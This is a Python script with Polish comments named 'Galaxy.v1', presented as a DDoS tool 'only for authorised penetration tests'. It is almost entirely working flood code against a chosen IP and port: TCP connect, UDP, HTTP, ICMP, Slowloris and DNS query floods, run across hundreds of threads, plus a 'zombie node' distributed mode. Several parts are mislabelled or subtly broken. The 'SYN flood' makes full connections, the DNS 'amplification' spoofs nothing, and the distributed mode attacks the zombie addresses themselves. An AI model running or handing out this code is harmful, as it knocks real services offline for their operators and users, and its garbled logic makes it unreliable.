

```python
#!/usr/bin/env python3
# Galaxy.v1 - Distributed Denial of Service Tool
# Tylko do użytku w autoryzowanych testach penetracyjnych

import socket
import threading
import random
import sys
import time
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor

class GalaxyV1:
    def __init__(self, target_ip, target_port, threads=500, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.running = False
        self.packets_sent = 0
        
    # 1. SYN Flood - atak na warstwę transportową
    def syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                src_port = random.randint(1024, 65535)
                sock.connect_ex((self.target_ip, self.target_port))
                self.packets_sent += 1
                sock.close()
            except:
                pass
    
    # 2. UDP Flood - atak na porty UDP
    def udp_flood(self):
        data = random._urandom(1024)
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.packets_sent += 1
                sock.close()
            except:
                pass
    
    # 3. HTTP Flood - atak na warstwę aplikacji
    def http_flood(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)",
            "Mozilla/5.0 (Linux; Android 11)"
        ]
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.target_ip, self.target_port))
                ua = random.choice(user_agents)
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {ua}\r\nAccept: */*\r\n\r\n"
                sock.send(request.encode())
                self.packets_sent += 1
                sock.close()
            except:
                pass
    
    # 4. ICMP Flood (Ping of Death)
    def icmp_flood(self):
        packet = IP(dst=self.target_ip)/ICMP()/("X"*1024)
        while self.running:
            try:
                send(packet, verbose=False)
                self.packets_sent += 1
            except:
                pass
    
    # 5. Slowloris - utrzymywanie połączeń otwartych
    def slowloris(self):
        sockets_list = []
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setblocking(0)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                sockets_list.append(sock)
            except:
                pass
        
        while self.running:
            for sock in sockets_list:
                try:
                    sock.send(f"X-header: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(10)
                except:
                    sockets_list.remove(sock)
    
    # 6. DNS Amplification (wymaga otwartych resolverów DNS)
    def dns_amplify(self, dns_servers):
        packet = IP(dst=random.choice(dns_servers))/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
        while self.running:
            try:
                send(packet, verbose=False)
                self.packets_sent += 1
            except:
                pass
    
    # 7. Multi-threaded atak - główny orchestrator
    def start_attack(self, attack_type="syn"):
        self.running = True
        print(f"[Galaxy.v1] Starting {attack_type.upper()} flood on {self.target_ip}:{self.target_port}")
        print(f"[Galaxy.v1] Threads: {self.threads} | Duration: {self.duration}s")
        
        if attack_type == "syn":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.syn_flood)
        
        elif attack_type == "udp":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.udp_flood)
        
        elif attack_type == "http":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.http_flood)
        
        elif attack_type == "icmp":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for _ in range(self.threads):
                    executor.submit(self.icmp_flood)
        
        elif attack_type == "slowloris":
            with ThreadPoolExecutor(max_workers=50) as executor:
                for _ in range(50):
                    executor.submit(self.slowloris)
        
        time.sleep(self.duration)
        self.running = False
        print(f"[Galaxy.v1] Attack finished. Packets sent: {self.packets_sent}")
    
    # 8. Tryb rozproszony (DDoS) - zombie nodes
    def distributed_mode(self, zombie_ips, attack_type="syn"):
        print("[Galaxy.v1] Launching DISTRIBUTED mode (DDoS)")
        print(f"[Galaxy.v1] Zombie nodes: {len(zombie_ips)}")
        
        def zombie_attack(ip):
            # Każdy zombie atakuje własny wątek
            zombie = GalaxyV1(ip, self.target_port, self.threads//len(zombie_ips), self.duration)
            zombie.start_attack(attack_type)
        
        with ThreadPoolExecutor(max_workers=len(zombie_ips)) as executor:
            executor.map(zombie_attack, zombie_ips)

# Główna funkcja - przykład użycia
if __name__ == "__main__":
    # Konfiguracja ataku
    TARGET_IP = "192.168.1.1"      # ZMIEŃ NA CEL TESTOWY
    TARGET_PORT = 80                 # Port (80=HTTP, 443=HTTPS, 53=DNS)
    THREADS = 500                    # Liczba wątków
    DURATION = 30                    # Czas ataku w sekundach
    
    # Inicjalizacja maszynki Galaxy.v1
    galaxy = GalaxyV1(TARGET_IP, TARGET_PORT, THREADS, DURATION)
    
    # Typ ataku: syn, udp, http, icmp, slowloris
    galaxy.start_attack(attack_type="syn")
    
    # Tryb DDoS (jeśli masz listę zombie)
